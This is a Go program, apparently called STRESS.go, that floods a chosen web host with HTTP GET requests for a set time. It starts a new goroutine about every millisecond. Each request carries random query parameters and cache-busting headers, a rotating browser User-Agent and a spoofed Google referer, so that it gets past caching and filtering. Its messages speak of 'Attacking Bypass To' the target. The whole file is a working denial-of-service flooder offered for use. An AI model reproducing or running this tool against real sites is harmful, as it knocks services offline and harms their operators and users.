package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/gookit/color"
)

const (
	// Define User-Agent strings here
	userAgent1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
	userAgent2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
	userAgent3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
	userAgent4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
	userAgent5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36"
	// Add more User-Agents as needed for better distribution
)


var (
	referers = []string{
		"https://www.google.com/?q=",
		"https://www.google.co.uk/?q=",
		"https://www.google.de/?q=",
		"https://www.google.ru/?q=",
		"https://www.google.tk/?q=",
		"https://www.google.cn/?q=",
		"https://www.google.cf/?q=",
		"https://www.google.nl/?q=",
	}
	userAgents = []string{
		userAgent1,
		userAgent2,
		userAgent3,
		userAgent4,
		userAgent5,
	}
	host         string
	paramJoiner  string
	reqCount     uint64
	duration     time.Duration
	stopFlag     int32
)

func buildBlock(size int) string {
	a := make([]rune, size)
	for i := 0; i < size; i++ {
		a[i] = rune(rand.Intn(26) + 65) // Generate random uppercase letters
	}
	return string(a)
}

func get() {
	if strings.ContainsRune(host, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}

	c := http.Client{
		Timeout: 3 * time.Second,
	}

	url := fmt.Sprintf("%s%s%s=%s", host, paramJoiner, buildBlock(rand.Intn(7)+3), buildBlock(rand.Intn(7)+3))
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println(err)
		return
	}

	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	req.Header.Add("Pragma", "no-cache")
	req.Header.Add("Cache-Control", "no-store, no-cache")
	req.Header.Set("Referer", referers[rand.Intn(len(referers))]+buildBlock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", fmt.Sprintf("%d", rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")

	resp, err := c.Do(req)
	atomic.AddUint64(&reqCount, 1)

	if err != nil {
		if os.IsTimeout(err) {
			color.Red.Println("Connection timed out")
		} else {
			color.Green.Println("Attacking Bypass To:", host)
		}
		return
	}

	defer resp.Body.Close()
}

func loop() {
	for {
		if atomic.LoadInt32(&stopFlag) == 1 {
			return
		}
		go get()
		time.Sleep(1 * time.Millisecond)
	}
}

func main() {
	flag.StringVar(&host, "host", "", "Host address (e.g., https://example.com)")
	flag.DurationVar(&duration, "time", 0, "Duration for which the requests should be sent (e.g., 10s or 1m)")
	flag.Parse()

	if len(host) == 0 {
		color.Red.Println("Missing host address.")
		color.Blue.Println("Example usage:\n\t go run STRESS.go --host https://example.com --time 30s")
		os.Exit(1)
	}

	if duration <= 0 {
		color.Red.Println("Invalid duration. Please specify a positive duration.")
		color.Blue.Println("Example usage:\n\t go run STRESS.go --host https://example.com --time 30s")
		os.Exit(1)
	}

	color.Yellow.Println("Press control+c to stop")
	time.Sleep(2 * time.Second)

	start := time.Now()

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		atomic.StoreInt32(&stopFlag, 1)
	}()

	for i := 0; i < 2; i++ {
		go loop()
	}

	time.Sleep(duration)
	color.Blue.Println("\nSuccess to Broadcast =>", atomic.LoadUint64(&reqCount), "requests in", time.Since(start))
}
